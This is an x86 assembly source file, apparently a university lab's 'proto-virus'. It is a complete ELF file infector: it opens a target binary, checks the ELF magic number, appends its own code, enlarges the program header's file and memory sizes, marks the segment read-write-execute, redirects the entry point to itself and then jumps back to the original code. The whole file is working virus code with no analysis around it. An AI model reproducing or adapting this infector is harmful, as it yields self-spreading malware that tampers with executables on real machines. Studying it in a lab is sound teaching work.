%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%macro blockSize 3
	mov %1,%3;
	sub %1,%2
%endmacro

%define STDOUT 1

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define	PHDR_vaddr	8
%define EHDR_size 52
%define magic_number 0x464c457f
%define program_table_size 64
global _start

	section .text
	section .text
_start:	
	push ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	;You code for this lab goes here
	call get_my_loc
	sub ebx,next_i-OutStr
	write STDOUT,ebx,32
	;Try to open ELFexec
	call get_my_loc
	sub ebx,next_i-FileName
	open ebx,RDWR,0777
	mov [esp],eax ;put the fd in stack(pos=0)
	cmp dword[esp],0 ;check if open failed
	jl Error
	;Check if ELFexec is of ELF format
	mov ebx,[esp];move the fd to ebx
	add esp,4;move pos of stack after fd in stack(pos=4)
	read ebx,esp,4
	sub esp,4;return to top of stack (pos=0)
	cmp dword[esp+4], magic_number ;magic 
	jne Error
	;Write the virus to end of ELFexec
	mov eax,[esp]
	lseek eax,0,SEEK_END
	mov [esp+4], eax ; save the file size befor adding the virus instead of magic number
	call get_my_loc
	sub ebx,next_i-_start
	blockSize ecx,_start,virus_end ;ecx will hold the size of start until the end
	mov eax,[esp]
	write eax,ebx,ecx
	;Reading the header of ELFexec to mem
	mov ebx,[esp];move fd to ebx
	lseek ebx,0,SEEK_SET;move to the beginning of the file
	mov ebx,[esp];move fd to ebx
	add esp,8 ;move esp to point after file size
	read ebx,esp,EHDR_size
	;Reading the program header table to esp(pos=60)
	mov ebx, [esp+PHDR_start] 	;getting the offset of program header table
	sub esp,8 ;	pos=0
	mov eax,[esp] ; move fd in eax
	lseek eax,ebx,SEEK_SET
	mov eax, [esp] ;move fd in eax
	add esp,8;	pos=8
	add esp, EHDR_size ; pos=60 (after header of ELFexec)
	read eax, esp, program_table_size  ; read program table to pos=60
	;Updating file size and mem size 
	mov edx, [esp-EHDR_size-4] ;save the file original size to edx (56=60-4)
	sub edx, [esp+PHDR_size+PHDR_offset] ; size of file - program offset
	blockSize ecx,_start,virus_end ;ecx will hold the size of start until the end
	add edx, ecx ; file size + virus code size - program header offset
	mov [esp+PHDR_size+PHDR_filesize], edx
	mov [esp+PHDR_size+PHDR_memsize], edx
	mov dword [esp+PHDR_size+PHDR_memsize+4], 0x7 ;RWE FLAG
	mov ebx, [esp-EHDR_size-8] ; mov fd to ebx
	lseek ebx,EHDR_size,SEEK_SET ;go program header table
	mov eax, [esp-EHDR_size-8]; mov fd to ebx
	write eax,esp,program_table_size
	mov ecx,program_table_size
	mov edx, [esp+PHDR_vaddr+32]
	mov [esp+ecx],edx ;place in esp pos=92 the virutal address
	sub esp,EHDR_size;pos=8
	;Writing the origin entry point to the end of file
	mov ebx, [esp-8]; mov fd to ebx
	lseek ebx,-4,SEEK_END
	mov ebx, [esp-8] ;moving the originb entry point to ebx
	add esp,ENTRY
	write ebx,esp,4
	;Overwrite the entry point of virus to the ELFexec
	sub esp,ENTRY;pos=8
	mov edx, [esp+EHDR_size+program_table_size] ;get the size of the first table
	mov  dword[esp+ENTRY],edx
	mov edx, [esp-4]
	add dword [esp+ENTRY], edx
	mov edx, [esp+EHDR_size+PHDR_size+PHDR_offset]
	sub dword [esp+ENTRY], edx
	;Writing back the header to ELFexec
	lseek ebx,0,SEEK_SET;move the pointer to the beginning of the file
	mov ebx,[esp-8]
	write ebx,esp,EHDR_size
	sub esp,8
	;Exit Virus
	call get_my_loc
	add ebx,PreviousEntryPoint-next_i
	mov ecx,[ebx]
	jmp ecx
VirusExit:
	mov eax,[esp]
	close eax          
    exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
Error:
	call get_my_loc
	sub ebx,next_i-Failstr
	write STDOUT,ebx,13
	call get_my_loc
	add ebx,PreviousEntryPoint-next_i
	mov ecx,[ebx]
	jmp ecx



FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
get_my_loc: 
	call next_i
next_i:
	pop ebx
	ret
PreviousEntryPoint: dd VirusExit
virus_end:


